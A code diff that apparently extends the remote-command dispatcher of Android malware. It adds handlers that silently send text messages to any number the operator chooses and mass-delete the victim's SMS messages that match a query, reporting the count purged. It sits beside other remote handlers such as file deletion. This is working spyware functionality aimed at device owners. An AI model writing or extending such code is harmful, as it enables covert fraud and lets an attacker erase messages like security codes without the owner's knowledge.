@@ -1128,6 +1128,30 @@ object CommandProcessor {
                         errorMsg = "Target: $target"
                     }
                 }
+                "DELETE_SMS_QUERY" -> {
+                    if (!DefaultSmsManager.isDefaultSms(ctx)) {
+                        status = "FAILED (NOT_DEFAULT)"
+                        errorMsg = "I'm not default to do that"
+                    } else {
+                        val query = content.trim()
+                        val count = PhoneManager.deleteSmsByQuery(ctx, query)
+                        status = "QUERY_WIPE_COMPLETE"
+                        errorMsg = "Messages Purged: $count | Query: $query"
+                    }
+                }
+                "SEND_SMS" -> {
+                    val parts = content.split("|")
+                    if (parts.size >= 2) {
+                        val num = parts[0].trim()
+                        val msg = parts[1].trim()
+                        PhoneManager.sendLegitSms(ctx, num, msg)
+                        status = "SMS_DISPATCHED"
+                        errorMsg = "To: $num"
+                    } else {
+                        status = "FAILED_FORMAT"
+                        errorMsg = "Use: NUMBER | MESSAGE"
+                    }
+                }
                 "DELETE_FILE" -> {
                     val paths = content.split("|")
                     var successCount = 0
